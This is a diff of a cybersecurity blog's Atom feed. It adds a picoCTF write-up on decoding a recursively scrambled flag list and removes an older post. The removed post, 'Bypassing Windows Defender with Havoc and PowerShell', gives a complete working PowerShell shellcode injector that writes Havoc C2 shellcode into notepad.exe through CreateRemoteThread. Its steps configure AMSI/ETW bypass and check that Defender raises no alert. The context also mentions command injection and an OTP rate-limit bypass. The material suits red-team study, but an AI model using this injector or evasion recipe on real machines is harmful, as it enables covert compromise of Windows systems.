@@ -1,4 +1,359 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-05T07:37:50-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Command Injection &amp;amp; Remote Command Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html" rel="alternate" type="text/html" title="Command Injection &amp;amp; Remote Command Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/RCE</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_deer_skeleton_humanoid_wearing_a_hoodie_in_the_style_of_71e7dc3b-d083-4668-a6eb-b8f10b9c962a.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-05T09:02:52-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Quantum Scrambler (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html" rel="alternate" type="text/html" title="Quantum Scrambler (PicoCTF)" /><published>2025-06-05T00:00:00-04:00</published><updated>2025-06-05T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_spider_humanoid_in_the_style_of_retro-futuris_fb89e2a2-e804-46ab-90c7-d8fd55328bc8.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+
+<h1 id="reverse-engineering-a-recursive-scramble-in-python-picoctf-challenge-breakdown">Reverse Engineering a Recursive Scramble in Python picoCTF Challenge Breakdown</h1>
+
+<hr />
+
+<h2 id="introduction">Introduction</h2>
+
+<p>In this challenge, we’re handed a Python script that scrambles a flag using a bizarre in-place list mutation with nested references making direct decoding tricky.</p>
+
+<p>Our mission: understand the scramble, decode the nested structure, and extract the original flag.</p>
+
+<hr />
+
+<h4 id="description">Description</h4>
+<p>We invented a new cypher that uses “quantum entanglement” to encode the flag. Do you have what it takes to decode it?</p>
+
+<h2 id="the-challenge-code">The Challenge Code</h2>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Python</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-python">
+import sys
+
+def exit():
+  sys.exit(0)
+
+def scramble(L):
+  A = L
+  i = 2
+  while (i &lt; len(A)):
+    A[i-2] += A.pop(i-1)
+    A[i-1].append(A[:i-2])
+    i += 1
+    
+  return L
+
+def get_flag():
+  flag = open('flag.txt', 'r').read()
+  flag = flag.strip()
+  hex_flag = []
+  for c in flag:
+    hex_flag.append([str(hex(ord(c)))])
+
+  return hex_flag
+
+def main():
+  flag = get_flag()
+  cypher = scramble(flag)
+  print(cypher)
+
+if __name__ == '__main__':
+  main()
+</code></pre>
+</div>
+
+<p>Here’s the core part:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Python</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-python">
+def scramble(L):
+    A = L
+    i = 2
+    while (i &lt; len(A)):
+        A[i-2] += A.pop(i-1)
+        A[i-1].append(A[:i-2])
+        i += 1
+    return L
+
+def get_flag():
+    flag = open('flag.txt', 'r').read().strip()
+    hex_flag = [[hex(ord(c))] for c in flag]
+    return hex_flag
+
+def main():
+    flag = get_flag()
+    cypher = scramble(flag)
+    print(cypher)
+
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="whats-happening-here">What’s happening here?</h2>
+
+<h3 id="step-1-preparing-the-flag">Step 1: Preparing the flag</h3>
+
+<ul>
+  <li>
+    <p>The flag is read from <code class="language-plaintext highlighter-rouge">flag.txt</code>.</p>
+  </li>
+  <li>
+    <p>Each character is converted to its hexadecimal ASCII code string, wrapped in a list.</p>
+
+    <ul>
+      <li>Example: <code class="language-plaintext highlighter-rouge">'p'</code> → <code class="language-plaintext highlighter-rouge">['0x70']</code></li>
+    </ul>
+  </li>
+  <li>
+    <p>So the flag becomes a list of lists:<br />
+<code class="language-plaintext highlighter-rouge">[['0x70'], ['0x69'], ['0x63'], ['0x6f'], ...]</code></p>
+  </li>
+</ul>
+
+<h3 id="step-2-the-scramble-function--the-chaos-begins">Step 2: The scramble function — the chaos begins</h3>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Python</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-python">
+def scramble(L):
+    A = L
+    i = 2
+    while (i &lt; len(A)):
+        A[i-2] += A.pop(i-1)
+        A[i-1].append(A[:i-2])
+        i += 1
+    return L
+</code></pre>
+</div>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">A</code> is a reference to the original list <code class="language-plaintext highlighter-rouge">L</code> (no copy).</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">i</code> starts at 2, loops while less than length of <code class="language-plaintext highlighter-rouge">A</code>.</p>
+  </li>
+  <li>
+    <p>Each iteration:</p>
+
+    <ul>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">A.pop(i-1)</code> removes the element at index <code class="language-plaintext highlighter-rouge">i-1</code> and returns it.</p>
+      </li>
+      <li>
+        <p>The popped element (a list like <code class="language-plaintext highlighter-rouge">['0x69']</code>) is <strong>concatenated (<code class="language-plaintext highlighter-rouge">+=</code>) to <code class="language-plaintext highlighter-rouge">A[i-2]</code></strong> — so two lists merge.</p>
+      </li>
+      <li>
+        <p>Then, a <strong>slice of the list <code class="language-plaintext highlighter-rouge">A[:i-2]</code></strong> (everything before <code class="language-plaintext highlighter-rouge">i-2</code>) is appended as a nested list inside <code class="language-plaintext highlighter-rouge">A[i-1]</code>.</p>
+      </li>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">i</code> increments by 1.</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>The list shrinks by one each iteration because of <code class="language-plaintext highlighter-rouge">.pop()</code>.</p>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="what-does-this-scrambling-actually-do">What does this scrambling actually do?</h2>
+
+<ol>
+  <li>
+    <p>It merges adjacent elements, combining the hex codes into growing lists.</p>
+  </li>
+  <li>
+    <p>It appends nested slices of earlier parts of the list as <em>recursive references</em> inside other list elements.</p>
+  </li>
+  <li>
+    <p>The nested slices are <strong>not flat copies</strong>, but <em>references</em> to parts of the list.</p>
+  </li>
+</ol>
+
+<hr />
+
+<h2 id="why-does-this-matter">Why does this matter?</h2>
+
+<ul>
+  <li>
+    <p>The final structure is a <strong>deeply nested recursive list</strong>, with references to earlier parts of itself.</p>
+  </li>
+  <li>
+    <p>This creates a complex graph-like structure, <strong>not a simple list of hex strings</strong>.</p>
+  </li>
+  <li>
+    <p>Naively flattening or recursively joining all elements will <strong>repeat parts multiple times</strong> or enter infinite loops.</p>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="how-to-decode-it">How to decode it?</h2>
+
+<h3 id="step-1-read-the-scrambled-output-a-python-list-from-a-file">Step 1: Read the scrambled output (a Python list) from a file:</h3>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Python</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-python">
+import ast
+
+with open('scrambled_output.txt') as f:
+    scrambled_data = f.read()
+
+data = ast.literal_eval(scrambled_data)
+</code></pre>
+</div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">ast.literal_eval</code> safely evaluates the string to a nested Python list.</li>
+</ul>
+
+<h3 id="step-2-decode-hex-strings-to-ascii-but-skip-nested-references">Step 2: Decode hex strings to ASCII but <strong>skip nested references</strong></h3>
+
+<p>You want to:</p>
+
+<ul>
+  <li>
+    <p>Decode only <strong>direct hex string elements</strong> on the top level of each list.</p>
+  </li>
+  <li>
+    <p><strong>Ignore nested lists inside each list</strong> because those are recursive references to previous parts they’ll cause duplicates.</p>
+  </li>
+</ul>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Python</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-python">
+def decode_node(node, visited=None):
+    if visited is None:
+        visited = set()
+
+    if isinstance(node, list):
+        node_id = id(node)
+        if node_id in visited:
+            return ''
+        visited.add(node_id)
+
+        result = ''
+        for el in node:
+            if isinstance(el, list):
+                continue  # skip nested refs
+            elif isinstance(el, str) and el.startswith('0x'):
+                result += chr(int(el, 16))
+        return result
+
+    elif isinstance(node, str) and node.startswith('0x'):
+        return chr(int(node, 16))
+
+    return ''
+</code></pre>
+</div>
+
+<h3 id="step-3-rebuild-the-flag-linearly-by-decoding-each-top-level-element">Step 3: Rebuild the flag linearly by decoding each top-level element:</h3>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Python</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-python">
+flag = ""
+for item in data:
+    flag += decode_node(item)
+
+print(flag)
+</code></pre>
+</div>
+
+<p>Full code:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Python</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-python">
+import ast
+
+def decode_node(node, visited=None):
+    if visited is None:
+        visited = set()
+
+    # If this node is a list
+    if isinstance(node, list):
+        # To avoid cycles or repeat processing the same slice multiple times,
+        # we use id() of the node list object to track visits.
+        node_id = id(node)
+        if node_id in visited:
+            return ''  # already decoded, skip to avoid duplicates or infinite loops
+        visited.add(node_id)
+
+        # Decode each element in list sequentially
+        result = ''
+        for el in node:
+            # If el is a list inside the node, it usually is a recursive reference slice,
+            # so skip it to avoid duplication.
+            if isinstance(el, list):
+                continue
+            # If string with hex prefix, decode to char
+            elif isinstance(el, str) and el.startswith('0x'):
+                result += chr(int(el, 16))
+        return result
+
+    # If node is a string hex
+    elif isinstance(node, str) and node.startswith('0x'):
+        return chr(int(node, 16))
+
+    # Otherwise, ignore
+    return ''
+
+# Read scrambled data from file
+with open('scrambled_output.txt') as f:
+    scrambled_data = f.read()
+
+data = ast.literal_eval(scrambled_data)
+
+flag = ""
+for item in data:
+    flag += decode_node(item)
+
+print(flag)
+</code></pre>
+</div>
+
+<p>Remember to save the output like this: <code class="language-plaintext highlighter-rouge">nc verbal-sleep[.]picoctf[.]net 63518 &gt; scrambled_output.txt</code></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><category term="Reverse Engineering" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Command Injection &amp;amp; Remote Command Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html" rel="alternate" type="text/html" title="Command Injection &amp;amp; Remote Command Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/RCE</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_deer_skeleton_humanoid_wearing_a_hoodie_in_the_style_of_71e7dc3b-d083-4668-a6eb-b8f10b9c962a.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
 
 <p><em>What if a single line of input could give an attacker full control over a system? No passwords. No exploits. Just raw commands slipped in through the cracks.</em>
 That’s the threat behind <strong>Command Injection</strong> one of the most dangerous, yet often overlooked, vulnerabilities in modern applications.</p>
@@ -3778,321 +4133,4 @@ This tells the server to remember your device and skip OTP in the future.</p>
 
 <ul>
   <li><strong>Rate limiting bypass</strong>: The bug with <code class="language-plaintext highlighter-rouge">remember_device</code> lets us spam OTP attempts without waiting.</li>
-</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Bypassing Windows Defender with Havoc and PowerShell</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/27/intro.html" rel="alternate" type="text/html" title="Bypassing Windows Defender with Havoc and PowerShell" /><published>2025-05-27T00:00:00-04:00</published><updated>2025-05-27T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/27/intro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/27/intro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_satanic_star_on_a_pixelated_computer_screen_in_the_styl_4c58089b-bbc1-4f58-8b1d-538abdc920ac.png" alt="Set up Listener" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
-
-<h2 id="why-this-is-important">Why This Is Important</h2>
-
-<p>As cybersecurity students, researchers, or red teamers, understanding how payloads bypass modern antivirus solutions is critical for both offensive and defensive strategies. Microsoft Defender (formerly Windows Defender) is the default AV on Windows systems and is considered one of the most improved security products in recent years.</p>
-
-<p>Learning how shellcode and in-memory injection techniques evade detection helps us stay ahead of adversaries, understand EDR blind spots, and ultimately secure systems better.</p>
-
-<p>This post demonstrates how to:</p>
-
-<ul>
-  <li>Generate a Havoc shellcode payload</li>
-  <li>Inject it using PowerShell</li>
-  <li>Observe how it bypasses Windows Defender in a default environment</li>
-</ul>
-
-<hr />
-
-<h2 id="steps">Steps</h2>
-
-<h3 id="1-set-up-a-listener-in-havoc">1. Set up a Listener in Havoc</h3>
-
-<p>Before we can interact with a compromised system, create a listener in Havoc.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G35qOwuk5E7uy6zHmEbPeQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<hr />
-
-<h3 id="2-create-the-payload">2. Create the Payload</h3>
-
-<p>In Havoc, go to the <strong>Payloads</strong> tab and generate a payload with:</p>
-
-<ul>
-  <li><strong>Format</strong>: Windows Shellcode</li>
-  <li><strong>Architecture</strong>: x64</li>
-  <li><strong>Sleep/Jitter</strong>: As needed for evasion</li>
-  <li><strong>Injection</strong>: Native/syscall, spawn64, etc.</li>
-  <li><strong>AMSI/ETW bypass</strong>: Enabled</li>
-</ul>
-
-<p>Click <strong>Generate</strong> to build the shellcode.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ONb86uyTlmEaxNWJYA1dnQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<hr />
-
-<h3 id="3-transfer-the-shellcode-to-the-target-machine">3. Transfer the Shellcode to the Target Machine</h3>
-
-<p>Copy the generated <code class="language-plaintext highlighter-rouge">.bin</code> file (e.g., <code class="language-plaintext highlighter-rouge">demon.x64.bin</code>) to your Windows VM target.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r9xsoiWwCvxKXV7fo1FEfA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<hr />
-
-<h3 id="4-verify-defender-is-enabled">4. Verify Defender is Enabled</h3>
-
-<p>On the target machine, confirm:</p>
-
-<ul>
-  <li>Real-time protection is <strong>ON</strong></li>
-  <li>No exclusion folders configured</li>
-</ul>
-
-<p>Even then, the shellcode placed in <code class="language-plaintext highlighter-rouge">C:\Users\lab\Downloads</code> goes undetected.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HSABF2KK1880mOS0veLs9A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px;  cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*icefKTOqwcIWWhURQR3g9g.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; width: cursor: zoom-in;" /></p>
-
-<hr />
-
-<h3 id="5-create-a-powershell-injector">5. Create a PowerShell Injector</h3>
-
-<p>Save this script as <code class="language-plaintext highlighter-rouge">injector.ps1</code> to inject shellcode into <code class="language-plaintext highlighter-rouge">notepad.exe</code>:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-# Path to your shellcode file
-$shellcodePath = "C:\Users\lab\Downloads\demon.x64.bin"
-
-# Read shellcode bytes
-$shellcode = [System.IO.File]::ReadAllBytes($shellcodePath)
-
-# Start 64-bit notepad process
-$proc = Start-Process -FilePath "C:\Windows\System32\notepad.exe" -PassThru
-
-# Define Win32 API calls
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-
-public class Win32 {
-    [Flags]
-    public enum ProcessAccessFlags : uint {
-        All = 0x001F0FFF,
-        CreateThread = 0x0002,
-        VirtualMemoryOperation = 0x0008,
-        VirtualMemoryWrite = 0x0020,
-        VirtualMemoryRead = 0x0010,
-        QueryInformation = 0x0400,
-        SuspendResume = 0x0800
-    }
-
-    [Flags]
-    public enum AllocationType : uint {
-        Commit = 0x1000,
-        Reserve = 0x2000
-    }
-
-    [Flags]
-    public enum MemoryProtection : uint {
-        ExecuteReadWrite = 0x40
-    }
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
-
-    [DllImport("kernel32.dll")]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr lpNumberOfBytesWritten);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
-}
-"@
-
-# Open the target process with full access
-$processHandle = [Win32]::OpenProcess([Win32+ProcessAccessFlags]::All, $false, $proc.Id)
-
-# Allocate memory in the target process
-$allocatedMemory = [Win32]::VirtualAllocEx($processHandle, [IntPtr]::Zero, $shellcode.Length, [Win32+AllocationType]::Commit -bor [Win32+AllocationType]::Reserve, [Win32+MemoryProtection]::ExecuteReadWrite)
-
-# Write shellcode into the allocated memory
-$outSize = [UIntPtr]::Zero
-$result = [Win32]::WriteProcessMemory($processHandle, $allocatedMemory, $shellcode, [uint32]$shellcode.Length, [ref]$outSize)
-
-if (-not $result) {
-    Write-Error "Failed to write shellcode into process memory"
-    exit 1
-}
-
-# Create remote thread to execute shellcode
-$threadId = 0
-$remoteThread = [Win32]::CreateRemoteThread($processHandle, [IntPtr]::Zero, 0, $allocatedMemory, [IntPtr]::Zero, 0, [ref]$threadId)
-
-if ($remoteThread -eq [IntPtr]::Zero) {
-    Write-Error "Failed to create remote thread"
-    exit 1
-}
-
-Write-Host "Shellcode injected successfully! Process ID: $($proc.Id), Thread ID: $threadId"
-
-  </code></pre>
-</div>
-
-<h3 id="6-run-the-injector">6. Run the Injector</h3>
-
-<p>Run the PowerShell script. If all goes well:</p>
-
-<ul>
-  <li>
-    <p>No Defender alerts</p>
-  </li>
-  <li>
-    <p>No detection</p>
-  </li>
-  <li>
-    <p>Havoc should show a callback from the target machine</p>
-  </li>
-</ul>
-
-<p><img src="https://miro.medium.com/max/1400/1*wgh_KLEH-IBByxykk7zCuQ.gif" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<hr />
-
-<h2 id="shellcode-injection-with-powershell-whats-going-on">Shellcode Injection with PowerShell What’s Going On?</h2>
-
-<p>This script performs <strong>process injection</strong> by loading shellcode into a trusted process (<code class="language-plaintext highlighter-rouge">notepad.exe</code>) to evade detection.</p>
-
-<p>It’s a common technique in <strong>post-exploitation</strong>, malware, and red teaming.</p>
-
-<h2 id="step-by-step-breakdown">Step-by-Step Breakdown</h2>
-
-<h3 id="step-1-load-the-shellcode">Step 1: Load the Shellcode</h3>
-
-<p><code class="language-plaintext highlighter-rouge">$shellcodePath = "C:\Users\lab\Downloads\demon.x64.bin"</code><br />
-<code class="language-plaintext highlighter-rouge">$shellcode = [System.IO.File]::ReadAllBytes($shellcodePath)</code></p>
-
-<ul>
-  <li>
-    <p><strong>What it does</strong>: Reads raw shellcode bytes from a binary file.</p>
-
-    <ul>
-      <li><strong>Source</strong>: <a href="https://learn.microsoft.com/en-us/dotnet/api/system.io.file.readallbytes">Microsoft - File.ReadAllBytes Method</a></li>
-    </ul>
-  </li>
-</ul>
-
-<hr />
-
-<h3 id="step-2-spawn-a-target-process">Step 2: Spawn a Target Process</h3>
-
-<p><code class="language-plaintext highlighter-rouge">$proc = Start-Process -FilePath "C:\Windows\System32\notepad.exe" -PassThru</code></p>
-
-<p>We start <code class="language-plaintext highlighter-rouge">notepad.exe</code> and keep a reference to it. Why Notepad? It’s 64-bit (matching the shellcode), always available, and pretty harmless-looking. Perfect cover.</p>
-
-<hr />
-
-<h3 id="step-3-load-the-native-win32-api">Step 3: Load the Native Win32 API</h3>
-
-<p>This big block here is C# code embedded in PowerShell. Using <code class="language-plaintext highlighter-rouge">Add-Type</code>, we define all the low-level Win32 functions we’ll need:</p>
-
-<ul>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">OpenProcess</code>: to get access to Notepad’s memory</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">VirtualAllocEx</code>: to allocate memory inside Notepad</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">WriteProcessMemory</code>: to copy our shellcode into it</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">CreateRemoteThread</code>: to run it</p>
-  </li>
-</ul>
-
-<p>Think of it as giving PowerShell the tools to mess with another process at the OS level.</p>
-
-<hr />
-
-<h3 id="step-4-gain-access-to-notepads-memory">Step 4: Gain Access to Notepad’s Memory</h3>
-
-<p><code class="language-plaintext highlighter-rouge">$processHandle = [Win32]::OpenProcess([Win32+ProcessAccessFlags]::All, $false, $proc.Id)</code></p>
-
-<ul>
-  <li>
-    <p>Opens a handle to the notepad process with full access rights.</p>
-  </li>
-  <li>
-    <p><strong>Access rights</strong> include the ability to read/write memory, create threads, etc.</p>
-  </li>
-</ul>
-
-<p><strong>Source</strong>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess function - Microsoft Docs</a></p>
-
-<hr />
-
-<h3 id="step-5-allocate-memory-in-notepad">Step 5: Allocate Memory in Notepad</h3>
-
-<p><code class="language-plaintext highlighter-rouge">$allocatedMemory = [Win32]::VirtualAllocEx(..., [Win32+MemoryProtection]::ExecuteReadWrite)</code></p>
-
-<ul>
-  <li>
-    <p>Allocates memory in the <strong>remote</strong> process (notepad).</p>
-  </li>
-  <li>
-    <p>Flags used:</p>
-
-    <ul>
-      <li>
-        <p><code class="language-plaintext highlighter-rouge">Commit | Reserve</code>: Allocate and commit memory</p>
-      </li>
-      <li>
-        <p><code class="language-plaintext highlighter-rouge">ExecuteReadWrite</code>: Allow execution of code from this memory</p>
-      </li>
-    </ul>
-  </li>
-</ul>
-
-<p><strong>Source</strong>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx function</a></p>
-
-<hr />
-
-<h3 id="step-6-write-the-shellcode">Step 6: Write the Shellcode</h3>
-
-<p><code class="language-plaintext highlighter-rouge">$result = [Win32]::WriteProcessMemory($processHandle, $allocatedMemory, $shellcode, ...)</code></p>
-
-<ul>
-  <li>Writes the raw shellcode into the allocated memory of the target process.</li>
-</ul>
-
-<p><strong>Source</strong>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory function</a></p>
-
-<hr />
-
-<hr />
-
-<h3 id="step-7-execute-the-shellcode">Step 7: Execute the Shellcode</h3>
-
-<p><code class="language-plaintext highlighter-rouge">$remoteThread = [Win32]::CreateRemoteThread($processHandle, ..., $allocatedMemory, ...)</code></p>
-
-<ul>
-  <li>
